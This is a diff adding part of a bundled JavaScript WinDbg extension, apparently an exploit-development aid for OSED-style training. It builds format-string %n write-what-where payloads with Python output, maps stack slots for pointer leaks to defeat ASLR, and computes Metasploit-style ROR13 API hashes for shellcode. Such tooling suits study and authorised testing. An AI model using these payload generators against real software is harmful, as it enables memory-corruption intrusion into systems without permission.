+            pattern: cave.pattern,
+            module: cave.module,
+            modulePath: cave.modulePath,
+            moduleBase: formatAddress(cave.moduleBase, pointerSize),
+            section: cave.section,
+            sectionExecutable: cave.sectionExecutable,
+            aslr: cave.aslr,
+            readable: cave.readable,
+            writable: cave.writable,
+            executable: cave.executable,
+            capabilities: cave.capabilities,
+            addrSafe: cave.addrSafe,
+            badBytes: cave.badBytes.map((b) => formatHexByte(b)),
+            safeOffset: cave.safeOffset,
+            safeVa: cave.safeVa !== null ? formatAddress(cave.safeVa, pointerSize) : null
+          })),
+          warnings,
+          errors: []
+        };
+      }
+    };
+  }
+
+  // src/logic/fmtstr_logic.ts
+  var WIDTHS = {
+    byte: { bytes: 1, mask: 255, mod: 256, spec: "hhn" },
+    word: { bytes: 2, mask: 65535, mod: 65536, spec: "hn" },
+    dword: { bytes: 4, mask: 4294967295, mod: 4294967296, spec: "n" }
+  };
+  var PAD_WARN_THRESHOLD = 65536;
+  function parseU32(value) {
+    if (typeof value === "number" && Number.isFinite(value)) {
+      return value >>> 0;
+    }
+    if (typeof value === "string") {
+      const text = value.trim();
+      if (/^0x[0-9a-fA-F]+$/.test(text)) {
+        return Number.parseInt(text, 16) >>> 0;
+      }
+      if (/^[0-9a-fA-F]+$/.test(text) && /[a-fA-F]/.test(text)) {
+        return Number.parseInt(text, 16) >>> 0;
+      }
+      if (/^[0-9]+$/.test(text)) {
+        return Number.parseInt(text, 10) >>> 0;
+      }
+    }
+    throw new Error(`Cannot parse "${String(value)}" as a 32-bit value.`);
+  }
+  function dwordLE2(value) {
+    return [value & 255, value >>> 8 & 255, value >>> 16 & 255, value >>> 24 & 255];
+  }
+  function buildFormatString(options) {
+    var _a, _b, _c;
+    const width = (_a = options.width) != null ? _a : "word";
+    const spec = WIDTHS[width];
+    const prefix = (_b = options.prefix) != null ? _b : 0;
+    const exclude = new Set(((_c = options.exclude) != null ? _c : []).map((b) => b & 255));
+    const warnings = [];
+    if (!Number.isInteger(options.argIndex) || options.argIndex < 1) {
+      throw new Error("argIndex must be a positive integer (the positional %N$ index of the first buffer dword).");
+    }
+    if (options.writes.length === 0) {
+      throw new Error("writes must contain at least one { addr, value } pair.");
+    }
+    const chunksPerWrite = 4 / spec.bytes;
+    const entries = [];
+    for (const write2 of options.writes) {
+      const addr = write2.addr >>> 0;
+      const value = write2.value >>> 0;
+      for (let c = 0; c < chunksPerWrite; c += 1) {
+        const shift = c * spec.bytes * 8;
+        const chunkVal = width === "dword" ? value >>> 0 : value >>> shift & spec.mask;
+        entries.push({ targetAddr: addr + c * spec.bytes >>> 0, chunkVal });
+      }
+    }
+    entries.sort((a, b) => a.chunkVal - b.chunkVal);
+    const addressDwords = entries.map((entry) => entry.targetAddr);
+    const addressBlock = addressDwords.flatMap(dwordLE2);
+    const addressBlockLen = addressBlock.length;
+    let runningCount = prefix + addressBlockLen >>> 0;
+    const rows = [];
+    let formatString = "";
+    entries.forEach((entry, i) => {
+      const arg = options.argIndex + i;
+      const current = runningCount % spec.mod;
+      const pad3 = (entry.chunkVal - current + spec.mod) % spec.mod;
+      if (pad3 > PAD_WARN_THRESHOLD) {
+        warnings.push(`Chunk ${i} needs ${pad3} padding bytes (target 0x${entry.chunkVal.toString(16)}). Consider a narrower width to shrink the payload.`);
+      }
+      const fragment = (pad3 > 0 ? `%${pad3}c` : "") + `%${arg}$${spec.spec}`;
+      formatString += fragment;
+      runningCount += pad3;
+      const written = runningCount % spec.mod;
+      if (written !== entry.chunkVal) {
+        throw new Error(`Internal error: chunk ${i} would write 0x${written.toString(16)}, expected 0x${entry.chunkVal.toString(16)}.`);
+      }
+      rows.push({
+        chunk: i,
+        targetAddr: entry.targetAddr,
+        value: entry.chunkVal,
+        arg,
+        cumCount: runningCount,
+        specifier: fragment
+      });
+    });
+    for (const write2 of options.writes) {
+      for (const b of dwordLE2(write2.addr >>> 0)) {
+        if (exclude.has(b)) {
+          warnings.push(`Target address 0x${(write2.addr >>> 0).toString(16).toUpperCase().padStart(8, "0")} contains badchar 0x${b.toString(16).padStart(2, "0")} \u2014 cannot be delivered as-is.`);
+          break;
+        }
+      }
+    }
+    const formatBytes = [...formatString].map((ch) => ch.charCodeAt(0));
+    for (const b of formatBytes) {
+      if (exclude.has(b)) {
+        warnings.push(`Format string contains badchar 0x${b.toString(16).padStart(2, "0")} (character "${String.fromCharCode(b)}").`);
+        break;
+      }
+    }
+    return {
+      addressBlock,
+      addressDwords,
+      formatString,
+      payload: [...addressBlock, ...formatBytes],
+      rows,
+      warnings
+    };
+  }
+
+  // src/commands/fmtstr.ts
+  function hexByte2(value) {
+    return value.toString(16).toUpperCase().padStart(2, "0");
+  }
+  function toPythonBytes(bytes) {
+    return `b"${bytes.map((b) => `\\x${b.toString(16).padStart(2, "0")}`).join("")}"`;
+  }
+  function isPrintableAscii(bytes) {
+    return bytes.every((b) => b >= 32 && b <= 126);
+  }
+  function parseWrites(raw) {
+    if (!Array.isArray(raw)) {
+      if (raw && typeof raw === "object") {
+        return parseWrites([raw]);
+      }
+      throw new Error("writes must be an array of { addr, value } pairs.");
+    }
+    return raw.map((entry, i) => {
+      if (!entry || typeof entry !== "object") {
+        throw new Error(`writes[${i}] must be an object with addr and value.`);
+      }
+      const record = entry;
+      if (record.addr === void 0 || record.value === void 0) {
+        throw new Error(`writes[${i}] requires both addr and value.`);
+      }
+      return { addr: parseU32(record.addr), value: parseU32(record.value) };
+    });
+  }
+  function normalizeWidth(value) {
+    if (value === "byte" || value === "word" || value === "dword") {
+      return value;
+    }
+    return "word";
+  }
+  function createFmtBuildCommand() {
+    return {
+      name: "fmt_build",
+      description: "Build a format-string %n write-what-where payload.",
+      usage: "dx @$osed().fmt.build(addr, value, argIndex, width?, exclude?, prefix?)",
+      examples: [
+        "dx @$osed().fmt.build(0x00402118, 0x625011AF, 6)",
+        'dx @$osed().fmt.build(0x00402118, 0x625011AF, 6, "word", "00 0A 0D")'
+      ],
+      schema: {
+        writes: { type: ["array", "object"], required: true },
+        argIndex: { type: "number", min: 1, required: true },
+        width: { type: "string", enum: ["byte", "word", "dword"], default: "word" },
+        exclude: { type: "array", elementType: "number", default: [0, 10, 13] },
+        prefix: { type: "number", min: 0, default: 0 }
+      },
+      execute(options) {
+        var _a, _b;
+        const writes2 = parseWrites(options.writes);
+        const argIndex = options.argIndex;
+        const width = normalizeWidth(options.width);
+        const normalizedExclude = normalizeByteArray((_a = options.exclude) != null ? _a : [0, 10, 13]);
+        const prefix = (_b = options.prefix) != null ? _b : 0;
+        const result3 = buildFormatString({
+          writes: writes2,
+          argIndex,
+          width,
+          exclude: normalizedExclude.values,
+          prefix
+        });
+        const warnings = [...result3.warnings];
+        if (normalizedExclude.warning) {
+          warnings.push(normalizedExclude.warning);
+        }
+        section("Format String Builder");
+        info(`Writes:   ${writes2.length} (${width}-granularity, ${result3.rows.length} chunks)`);
+        info(`ArgIndex: ${argIndex}  Prefix: ${prefix}`);
+        section("Chunk breakdown");
+        table([
+          { key: "chunk", header: "Chunk", width: 6 },
+          { key: "addr", header: "TargetAddr", width: 12 },
+          { key: "value", header: "Value", width: 8 },
+          { key: "arg", header: "Arg", width: 5 },
+          { key: "count", header: "CumCount", width: 10 },
+          { key: "spec", header: "Specifier", width: 18 }
+        ], result3.rows.map((row) => ({
+          chunk: `${row.chunk}`,
+          addr: `0x${row.targetAddr.toString(16).toUpperCase().padStart(8, "0")}`,
+          value: `0x${row.value.toString(16).toUpperCase()}`,
+          arg: `${row.arg}`,
+          count: `${row.cumCount}`,
+          spec: row.specifier
+        })));
+        section("Address block");
+        for (let i = 0; i < result3.addressDwords.length; i += 1) {
+          const dword = result3.addressDwords[i];
+          const bytes = result3.addressBlock.slice(i * 4, i * 4 + 4).map(hexByte2).join(" ");
+          print(`  ${bytes}    ; slot ${i} -> %${argIndex + i}$  (0x${dword.toString(16).toUpperCase().padStart(8, "0")})`);
+        }
+        section("Format string");
+        print(result3.formatString);
+        section("Python");
+        print("def p32(v): return struct.pack('<I', v)");
+        print("payload = (");
+        for (const dword of result3.addressDwords) {
+          print(`    p32(0x${dword.toString(16).toUpperCase().padStart(8, "0")}) +`);
+        }
+        const fmtBytes = [...result3.formatString].map((ch) => ch.charCodeAt(0));
+        const fmtLiteral = isPrintableAscii(fmtBytes) ? `b"${result3.formatString.replace(/"/g, '\\"')}"` : toPythonBytes(fmtBytes);
+        print(`    ${fmtLiteral}`);
+        print(")");
+        section("Payload (hex)");
+        print(result3.payload.map(hexByte2).join(" "));
+        if (warnings.length > 0) {
+          section("Warnings");
+          for (const warning of warnings) {
+            warn(warning);
+          }
+        }
+        whyItMatters("Format-string %n writes are pure arithmetic on the printed-byte count \u2014 automating it removes the most error-prone hand calculation in the module.");
+        return {
+          command: "fmt_build",
+          args: options,
+          success: true,
+          findings: [
+            {
+              width,
+              argIndex,
+              prefix,
+              addressDwords: result3.addressDwords,
+              formatString: result3.formatString,
+              payload: result3.payload,
+              rows: result3.rows
+            }
+          ],
+          warnings,
+          errors: []
+        };
+      }
+    };
+  }
+  function readStackPointer(pointerSize) {
+    var _a, _b;
+    const thread = host.currentThread;
+    const regsRoot = (_a = thread == null ? void 0 : thread.Registers) != null ? _a : void 0;
+    const userRegs = (_b = regsRoot == null ? void 0 : regsRoot.User) != null ? _b : regsRoot;
+    if (!userRegs) {
+      return void 0;
+    }
+    const name = pointerSize === 8 ? "rsp" : "esp";
+    for (const key2 of Object.keys(userRegs)) {
+      if (key2.toLowerCase() === name || key2.toLowerCase() === (pointerSize === 8 ? "esp" : "rsp")) {
+        try {
+          const value = userRegs[key2];
+          if (typeof value === "bigint")
+            return value;
+          if (typeof value === "number")
+            return __bi(value);
+          const parsed = __bi(String(value));
+          return parsed;
+        } catch (_error) {
+          return void 0;
+        }
+      }
+    }
+    return void 0;
+  }
+  function stackBounds(pointerSize) {
+    var _a;
+    if (pointerSize !== 4) {
+      return {};
+    }
+    const thread = host.currentThread;
+    let teb;
+    const raw = (_a = thread == null ? void 0 : thread.Teb) != null ? _a : thread == null ? void 0 : thread.TebAddress;
+    try {
+      if (typeof raw === "bigint")
+        teb = raw;
+      else if (typeof raw === "number")
+        teb = __bi(raw);
+      else if (raw !== void 0)
+        teb = __bi(String(raw));
+    } catch (_error) {
+      teb = void 0;
+    }
+    if (teb === void 0) {
+      return {};
+    }
+    try {
+      const base = readPointer(teb + __bi(4), 4);
+      const limit = readPointer(teb + __bi(8), 4);
+      return { base, limit };
+    } catch (_error) {
+      return {};
+    }
+  }
+  function classify(value, marker, bounds, sp) {
+    if (__bi.and(value, __bi(4294967295)) === __bi(marker >>> 0)) {
+      return "marker";
+    }
+    const module = findModuleByAddress(value);
+    if (module) {
+      return `ptr->${module.name}`;
+    }
+    if (bounds.base !== void 0 && bounds.limit !== void 0 && value >= bounds.limit && value < bounds.base) {
+      return "ptr->stack";
+    }
+    if (bounds.base === void 0 && sp !== void 0) {
+      const delta = value > sp ? value - sp : sp - value;
+      if (delta < __bi(1048576)) {
+        return "ptr->stack";
+      }
+    }
+    if (tryReadMemory(value, 4)) {
+      return "ptr->readable";
+    }
+    return "";
+  }
+  function analyzeFormatString(text) {
+    const findings = [];
+    const expression = /%(?:\d+\$)?[-+ #0']*(?:\*|\d+)?(?:\.(?:\*|\d+)?)?(?:hh|h|ll|l|j|z|t|L)?([%cCdiouxXfFeEgGaAnpsS])/g;
+    for (const match of text.matchAll(expression)) {
+      const conversion = match[1].toLowerCase();
+      if (conversion === "%")
+        continue;
+      findings.push({
+        token: match[0],
+        conversion,
+        disclosure: conversion === "p" || conversion === "s" || conversion === "n",
+        write: conversion === "n"
+      });
+    }
+    return findings;
+  }
+  function readAsciiString(address, max) {
+    const bytes = [];
+    for (let offset = 0; offset < max; offset += 1) {
+      const next = tryReadMemory(address + __bi(offset), 1);
+      if (!next)
+        return void 0;
+      if (next[0] === 0)
+        return { text: String.fromCharCode(...bytes), terminated: true };
+      bytes.push(next[0]);
+    }
+    return { text: String.fromCharCode(...bytes), terminated: false };
+  }
+  var FORMAT_ARGUMENT_OFFSETS = {
+    printf: 4,
+    fprintf: 8,
+    sprintf: 8,
+    snprintf: 12
+  };
+  function createFmtInspectCommand() {
+    return {
+      name: "fmt_inspect",
+      description: "Inspect a paused x86 printf-family call and classify its format argument.",
+      usage: "dx @$osed().fmt.inspect(family?, formatArgOffset?, max?)",
+      examples: [
+        'dx @$osed().fmt.inspect("printf")',
+        'dx @$osed().fmt.inspect("snprintf")',
+        'dx @$osed().fmt.inspect("printf", 4, 512)'
+      ],
+      schema: {
+        family: { type: "string", enum: ["printf", "fprintf", "sprintf", "snprintf"], default: "printf" },
+        formatArgOffset: { type: "number", min: 0 },
+        max: { type: "number", min: 1, max: 4096, default: 512 }
+      },
+      execute(options) {
+        var _a;
+        const pointerSize = getPointerSize();
+        if (pointerSize !== 4) {
+          return {
+            command: "fmt_inspect",
+            args: options,
+            success: false,
+            findings: [],
+            warnings: [],
+            errors: ["fmt.inspect currently supports x86 cdecl printf-family calls only; x64 ABI argument decoding is not implemented."]
+          };
+        }
+        const sp = readStackPointer(pointerSize);
+        if (sp === void 0) {
+          return { command: "fmt_inspect", args: options, success: false, findings: [], warnings: [], errors: ["ESP is unavailable \u2014 break at a supported printf-family call entry or call site."] };
+        }
+        const family = options.family;
+        const formatArgOffset = (_a = options.formatArgOffset) != null ? _a : FORMAT_ARGUMENT_OFFSETS[family];
+        const pointerBytes = tryReadMemory(sp + __bi(formatArgOffset), 4);
+        if (!pointerBytes) {
+          return { command: "fmt_inspect", args: options, success: false, findings: [], warnings: [], errors: [`Could not read ${family} format argument at ESP+0x${formatArgOffset.toString(16)}.`] };
+        }
+        const formatAddress2 = __bi.and(__bi(pointerBytes[0] | pointerBytes[1] << 8 | pointerBytes[2] << 16 | pointerBytes[3] << 24), __bi(4294967295));
+        const string = readAsciiString(formatAddress2, options.max);
+        if (!string) {
+          return { command: "fmt_inspect", args: options, success: false, findings: [], warnings: [], errors: [`Could not read format string at ${formatAddress(formatAddress2, pointerSize)}.`] };
+        }
+        const specifiers = analyzeFormatString(string.text);
+        const writes2 = specifiers.filter((specifier) => specifier.write);
+        const disclosures = specifiers.filter((specifier) => specifier.disclosure);
+        let markerIndex;
+        for (let index = 0; index < 40; index += 1) {
+          const cell = tryReadMemory(sp + __bi(formatArgOffset + 4 + index * 4), 4);
+          if (!cell)
+            break;
+          const value = (cell[0] | cell[1] << 8 | cell[2] << 16 | cell[3] << 24) >>> 0;
+          if (value === 1094795585) {
+            markerIndex = index + 1;
+            break;
+          }
+        }
+        const warnings = [];
+        if (!string.terminated)
+          warnings.push(`Format string was truncated at ${options.max} bytes without a terminator.`);
+        section("FORMAT CALL INSPECTION");
+        info(`Family: ${family} | ABI: x86 cdecl | ESP: ${formatAddress(sp, pointerSize)}`);
+        print(`Format argument: ESP+0x${formatArgOffset.toString(16).toUpperCase()} -> ${formatAddress(formatAddress2, pointerSize)}`);
+        print(`Format text: ${JSON.stringify(string.text)}`);
+        table([{ key: "token", header: "Specifier", width: 16 }, { key: "meaning", header: "Classification", width: 30 }], specifiers.map((specifier) => ({ token: specifier.token, meaning: specifier.write ? "potential %n memory-write primitive" : specifier.disclosure ? "potential disclosure primitive" : "format conversion" })));
+        section("ASSESSMENT");
+        print(`  Controlled marker in scanned varargs: ${markerIndex === void 0 ? "not observed" : `%${markerIndex}$`}`);
+        print(`  Potential disclosure specifiers: ${disclosures.length}`);
+        print(`  Potential write specifiers (%n): ${writes2.length}`);
+        print("  Reachability, attacker control, and externally observable output are not established.");
+        return {
+          command: "fmt_inspect",
+          args: options,
+          success: true,
+          findings: [{ family, esp: sp, formatArgOffset, formatAddress: formatAddress2, format: string.text, terminated: string.terminated, specifiers, markerIndex }],
+          warnings,
+          errors: []
+        };
+      }
+    };
+  }
+  function createFmtOffsetCommand() {
+    return {
+      name: "fmt_offset",
+      description: "Locate the controlled parameter index and leakable pointers on the stack at a printf-family call.",
+      usage: "dx @$osed().fmt.offset(0x41414141, 40, 8)",
+      examples: [
+        "dx @$osed().fmt.offset()",
+        "dx @$osed().fmt.offset(0x41414141, 40)",
+        "dx @$osed().fmt.offset(0x41414141, 40, 8)"
+      ],
+      schema: {
+        marker: { type: "number", default: 1094795585 },
+        count: { type: "number", min: 1, max: 256, default: 40 },
+        firstArg: { type: "number", min: 0, default: 8 }
+      },
+      execute(options) {
+        var _a, _b, _c;
+        const pointerSize = getPointerSize();
+        const marker = ((_a = options.marker) != null ? _a : 1094795585) >>> 0;
+        const count = (_b = options.count) != null ? _b : 40;
+        const firstArg = (_c = options.firstArg) != null ? _c : 8;
+        const warnings = [];
+        if (pointerSize !== 4) {
+          warnings.push("fmt.offset parameter mapping is calibrated for x86 (cdecl) printf-family calls.");
+        }
+        const sp = readStackPointer(pointerSize);
+        if (sp === void 0) {
+          return {
+            command: "fmt_offset",
+            args: options,
+            success: false,
+            findings: [],
+            warnings,
+            errors: ["Stack pointer unavailable \u2014 is the target broken in?"]
+          };
+        }
+        const bounds = stackBounds(pointerSize);
+        const base = sp + __bi(firstArg);
+        const rows = [];
+        let markerIndex;
+        for (let i = 0; i < count; i += 1) {
+          const stackAddr = base + __bi(i * 4);
+          const cell = tryReadMemory(stackAddr, 4);
+          if (!cell) {
+            warnings.push(`Stack read failed at ${formatAddress(stackAddr, pointerSize)}; stopping scan.`);
+            break;
+          }
+          const value = __bi.and(__bi(cell[0] | cell[1] << 8 | cell[2] << 16 | cell[3] << 24), __bi(4294967295));
+          const meaning = classify(value, marker, bounds, sp);
+          const idx = i + 1;
+          if (meaning === "marker" && markerIndex === void 0) {
+            markerIndex = idx;
+          }
+          rows.push({ idx, stackAddr, value, meaning });
+        }
+        section("Format String Parameter Map");
+        info(`${pointerSize === 8 ? "RSP" : "ESP"}: ${formatAddress(sp, pointerSize)}  firstArg: +${firstArg}  marker: 0x${marker.toString(16).toUpperCase().padStart(8, "0")}`);
+        info(markerIndex !== void 0 ? `Controlled parameter index: %${markerIndex}$  (use argIndex ${markerIndex} in fmt.build)` : "Marker not found in scanned range \u2014 adjust firstArg/count or check the buffer.");
+        table([
+          { key: "idx", header: "Idx", width: 5 },
+          { key: "stackAddr", header: "StackAddr", width: 12 },
+          { key: "value", header: "Value", width: 12 },
+          { key: "meaning", header: "Meaning", width: 18 }
+        ], rows.map((row) => ({
+          idx: `%${row.idx}$`,
+          stackAddr: formatAddress(row.stackAddr, pointerSize),
+          value: `0x${row.value.toString(16).toUpperCase().padStart(8, "0")}`,
+          meaning: row.meaning || "-"
+        })));
+        whyItMatters("Format-string exploitation hinges on knowing which parameter index reaches your buffer and which stack slots leak module/stack pointers for ASLR defeat.");
+        return {
+          command: "fmt_offset",
+          args: options,
+          success: true,
+          findings: [{ markerIndex, esp: sp, firstArg, marker, slots: rows }],
+          warnings,
+          errors: []
+        };
+      }
+    };
+  }
+  function createFmtCommands() {
+    return [createFmtBuildCommand(), createFmtOffsetCommand(), createFmtInspectCommand()];
+  }
+
+  // src/core/dx_result.ts
+  var DxRow = class {
+    constructor(values) {
+      for (const [key2, value] of Object.entries(values)) {
+        this[key2] = value;
+      }
+    }
+    toString() {
+      const pairs = Object.entries(this).filter(([, value]) => typeof value === "string");
+      return pairs.map(([key2, value]) => `${key2}: ${stripDml(value)}`).join(" | ");
+    }
+  };
+  var DxRows = class {
+    constructor(title, values) {
+      Object.defineProperty(this, "title", {
+        value: title,
+        enumerable: false,
+        configurable: false,
+        writable: false
+      });
+      Object.defineProperty(this, "values", {
+        value: values,
+        enumerable: false,
+        configurable: false,
+        writable: false
+      });
+      this.length = values.length;
+      values.forEach((row, index) => {
+        Object.defineProperty(this, index, {
+          value: row,
+          enumerable: false,
+          configurable: false,
+          writable: false
+        });
+      });
+    }
+    [Symbol.iterator]() {
+      return this.values[Symbol.iterator]();
+    }
+    map(callback) {
+      return this.values.map(callback);
+    }
+    forEach(callback) {
+      this.values.forEach(callback);
+    }
+    slice(start, end) {
+      return this.values.slice(start, end);
+    }
+    toArray() {
+      return [...this.values];
+    }
+    toString() {
+      return `${this.title}: ${this.length} row${this.length === 1 ? "" : "s"}; expand rows[N] for details`;
+    }
+  };
+  var DxResult = class {
+    constructor(title, rows) {
+      this.title = title;
+      this.rows = new DxRows(title, rows.map((row) => new DxRow(row)));
+      this.length = this.rows.length;
+    }
+    toString() {
+      return `${this.title}: ${this.length} row${this.length === 1 ? "" : "s"}`;
+    }
+  };
+  function toDxResult(title, rows) {
+    return new DxResult(title, rows);
+  }
+
+  // src/shellcode/index.ts
+  var MetasploitRor13Provider = class {
+    constructor() {
+      this.algorithm = "metasploit_ror13";
+      this.aliases = ["ror13", "msf_ror13"];
+      this.description = "Classic Metasploit-style API hash: ROR 13 then add byte.";
+    }
+    ror32(value, bits) {
+      const shift = bits & 31;
+      return (value >>> shift | value << 32 - shift) >>> 0;
+    }
+    hash(text) {
+      let hash = 0;
+      for (const byte of asciiBytes(text)) {
+        hash = this.ror32(hash, 13);
+        hash = hash + byte >>> 0;
+      }
+      return hash >>> 0;
+    }
+  };
+  var HashResolver = class {
+    constructor(providers) {
+      this.defaultAlias = "ror13";
+      var _a;
+      const configured = providers != null ? providers : [
+        new MetasploitRor13Provider(),
+        new Crc32Provider(),
+        new Rol7AddProvider()
+      ];
+      this.canonicalProviders = configured;
+      this.providers = /* @__PURE__ */ new Map();
+      for (const provider of configured) {
+        this.providers.set(provider.algorithm.toLowerCase(), provider);
+        for (const alias of (_a = provider.aliases) != null ? _a : []) {
+          this.providers.set(alias.toLowerCase(), provider);
+        }
+      }
+    }
+    compute(exportsList, algorithm) {
+      const provider = this.resolveProvider(algorithm);
+      if (!provider) {
+        throw new Error(`Unknown hash algorithm "${algorithm}". Supported: ${this.supportedAlgorithms().join(", ")}.`);
+      }
+      const label = this.displayName(provider);
+      return exportsList.filter((entry) => entry.name.length > 0).map((entry) => ({
+        Algorithm: label,
+        Hash: `0x${provider.hash(entry.name).toString(16).toUpperCase().padStart(8, "0")}`,
+        Name: entry.name,
+        Address: toDmlAddress(entry.va, "u")
+      })).sort((a, b) => a.Name.localeCompare(b.Name));
+    }
+    hashValue(text, algorithm) {
+      const provider = this.resolveProvider(algorithm);
+      if (!provider) {
+        throw new Error(`Unknown hash algorithm "${algorithm}". Supported: ${this.supportedAlgorithms().join(", ")}.`);
+      }
+      return {
+        Input: text,
+        Algorithm: this.displayName(provider),
+        Hash: `0x${provider.hash(text).toString(16).toUpperCase().padStart(8, "0")}`
+      };
+    }
+    listAlgorithms() {
+      const defaultProvider = this.resolveProvider(this.defaultAlias);
+      return this.canonicalProviders.map((provider) => {
+        var _a;
+        return {
+          Algorithm: provider.algorithm,
+          Aliases: ((_a = provider.aliases) != null ? _a : []).join(", "),
+          Description: provider.description,
+          Default: provider === defaultProvider ? "yes" : "no"
+        };
+      }).sort((a, b) => a.Algorithm.localeCompare(b.Algorithm));
+    }
+    supportedAlgorithms() {
+      return Array.from(this.providers.keys()).sort();
+    }
+    resolveProvider(algorithm) {
+      const selected = (algorithm != null ? algorithm : this.defaultAlias).trim().toLowerCase();
+      return this.providers.get(selected);
+    }
+    displayName(provider) {
+      return provider.aliases && provider.aliases.length > 0 ? provider.aliases[0].toUpperCase() : provider.algorithm;
+    }
+  };
+  var Crc32Provider = class {
+    constructor() {
+      this.algorithm = "crc32";
+      this.description = "CRC32 (IEEE polynomial 0xEDB88320) over ASCII bytes.";
+      this.table = this.buildTable();
+    }
+    hash(text) {
+      let crc = 4294967295;
+      for (const byte of asciiBytes(text)) {
+        const index = (crc ^ byte) & 255;
+        crc = crc >>> 8 ^ this.table[index];
+      }
+      return (crc ^ 4294967295) >>> 0;
+    }
+    buildTable() {
+      const table2 = [];
+      for (let i = 0; i < 256; i += 1) {
+        let value = i;
+        for (let bit = 0; bit < 8; bit += 1) {
+          if ((value & 1) === 1) {
+            value = value >>> 1 ^ 3988292384;
+          } else {
+            value >>>= 1;
+          }
+        }
+        table2.push(value >>> 0);
+      }
+      return table2;
+    }
+  };
+  var Rol7AddProvider = class {
+    constructor() {
+      this.algorithm = "rol7_add";
+      this.aliases = ["rol7"];
+      this.description = "Rotate-left by 7 then add byte (32-bit accumulator).";
+    }
+    rol32(value, bits) {
+      const shift = bits & 31;
+      return (value << shift | value >>> 32 - shift) >>> 0;
+    }
+    hash(text) {
+      let hash = 0;
+      for (const byte of asciiBytes(text)) {
+        hash = this.rol32(hash, 7);
+        hash = hash + byte >>> 0;
+      }
+      return hash >>> 0;
+    }
+  };
+  function asciiBytes(text) {
+    const bytes = [];
+    for (let i = 0; i < text.length; i += 1) {
+      const code = text.charCodeAt(i);
+      if (code > 127) {
+        throw new Error("Hash input must be ASCII for shellforge parity.");
+      }
+      bytes.push(code & 255);
+    }
+    return bytes;
+  }
+  var PEParser = class {
+    constructor(pointerSize) {
+      this.pointerSize = pointerSize;
+    }
+    parseHeaders(module) {
+      const base = module.base;
+      const mz = readUint16LE(base);
+      if (mz !== 23117) {
+        throw new Error(`Invalid DOS header for ${module.name}.`);
+      }
+      const eLfanew = readUint32LE(base + __bi(60));
+      const ntHeader = base + __bi(eLfanew);
+      const signature = readUint32LE(ntHeader);
+      if (signature !== 17744) {
+        throw new Error(`Invalid NT header signature for ${module.name}.`);
+      }
+      const machine = readUint16LE(ntHeader + __bi(4));
+      let timeDateStamp = 0;
+      try {
+        timeDateStamp = readUint32LE(ntHeader + __bi(8));
+      } catch (_error) {
+      }
+      const optionalHeader = ntHeader + __bi(24);
+      const optionalHeaderMagic = readUint16LE(optionalHeader);
+      const isPe32Plus = optionalHeaderMagic === 523;
+      if (!isPe32Plus && optionalHeaderMagic !== 267) {
+        throw new Error(`Unsupported optional header magic 0x${optionalHeaderMagic.toString(16)}.`);
+      }
+      const entryPointRva = readUint32LE(optionalHeader + __bi(16));
+      const imageBase = isPe32Plus ? readPointer(optionalHeader + __bi(24), 8) : __bi(readUint32LE(optionalHeader + __bi(28)));
+      const sizeOfImage = readUint32LE(optionalHeader + __bi(56));
+      const dataDirectoryOffset = optionalHeader + __bi(isPe32Plus ? 112 : 96);
+      const exportDirectoryRva = readUint32LE(dataDirectoryOffset);
+      const exportDirectorySize = readUint32LE(dataDirectoryOffset + __bi(4));
+      return {
+        dosHeader: base,
+        eLfanew,
+        ntHeader,
+        machine,
+        machineName: machineToString(machine),
+        timeDateStamp,
+        entryPointRva,
+        entryPointVa: base + __bi(entryPointRva),
+        imageBase,
+        sizeOfImage,
+        optionalHeaderMagic,
+        exportDirectoryRva,
+        exportDirectoryVa: base + __bi(exportDirectoryRva),
+        exportDirectorySize
+      };
+    }
+    parseExports(module) {
+      var _a;
+      const exportInfo = this.parseExportDirectory(module);
+      if (!exportInfo) {
+        return [];
+      }
+      if (exportInfo.numberOfFunctions === 0 || exportInfo.addressOfFunctionsRva === 0) {
+        return [];
+      }
+      const functionsVa = module.base + __bi(exportInfo.addressOfFunctionsRva);
+      const namesVa = module.base + __bi(exportInfo.addressOfNamesRva);
+      const ordinalsVa = module.base + __bi(exportInfo.addressOfNameOrdinalsRva);
+      const namesByIndex = /* @__PURE__ */ new Map();
+      for (let i = 0; i < exportInfo.numberOfNames; i += 1) {
+        const nameRva = readUint32LE(namesVa + __bi(i * 4));
+        const ordinalIndex = readUint16LE(ordinalsVa + __bi(i * 2));
+        const nameAddress = module.base + __bi(nameRva);
+        namesByIndex.set(ordinalIndex, readAsciiString2(nameAddress, 512));
+      }
+      const entries = [];
+      for (let index = 0; index < exportInfo.numberOfFunctions; index += 1) {
+        const rva = readUint32LE(functionsVa + __bi(index * 4));
+        const va = module.base + __bi(rva);
+        const ordinal = exportInfo.ordinalBase + index;
+        entries.push({
+          ordinal,
+          rva,
+          va,
+          name: (_a = namesByIndex.get(index)) != null ? _a : ""
+        });
+      }
+      return entries;
+    }
+    formatHeaderRows(module) {
+      const headers = this.parseHeaders(module);
+      return [
+        { Field: "Base", Value: toDmlAddress(module.base, "db") },
+        { Field: "DOS Header", Value: toDmlAddress(headers.dosHeader, "db") },
+        { Field: "e_lfanew", Value: `0x${headers.eLfanew.toString(16).toUpperCase()}` },
+        { Field: "NT Header", Value: toDmlAddress(headers.ntHeader, "db") },
+        { Field: "Machine", Value: `${headers.machineName} (0x${headers.machine.toString(16).toUpperCase()})` },
+        { Field: "EntryPoint", Value: `${toDmlAddress(headers.entryPointVa, "u")} (RVA 0x${headers.entryPointRva.toString(16).toUpperCase()})` },
+        { Field: "ImageBase", Value: formatAddress(headers.imageBase, this.pointerSize) },
+        { Field: "SizeOfImage", Value: `0x${headers.sizeOfImage.toString(16).toUpperCase()}` },
+        { Field: "ExportDir RVA", Value: `0x${headers.exportDirectoryRva.toString(16).toUpperCase()}` },
+        { Field: "ExportDir VA", Value: toDmlAddress(headers.exportDirectoryVa, "db") }
+      ];
+    }
+    parseExportDirectory(module) {
+      const headers = this.parseHeaders(module);
+      if (headers.exportDirectoryRva === 0 || headers.exportDirectorySize === 0) {
+        return void 0;
+      }
+      const exportDir = module.base + __bi(headers.exportDirectoryRva);
+      return {
+        exportDirectoryRva: headers.exportDirectoryRva,
+        exportDirectoryVa: headers.exportDirectoryVa,
+        exportDirectorySize: headers.exportDirectorySize,
+        ordinalBase: readUint32LE(exportDir + __bi(16)),
+        numberOfFunctions: readUint32LE(exportDir + __bi(20)),
+        numberOfNames: readUint32LE(exportDir + __bi(24)),
+        addressOfFunctionsRva: readUint32LE(exportDir + __bi(28)),
+        addressOfNamesRva: readUint32LE(exportDir + __bi(32)),
+        addressOfNameOrdinalsRva: readUint32LE(exportDir + __bi(36))
+      };
+    }
+  };
+  var ExportResolver = class {
+    constructor(parser) {
+      // parseExports reads the module's whole export table (many string reads). It is
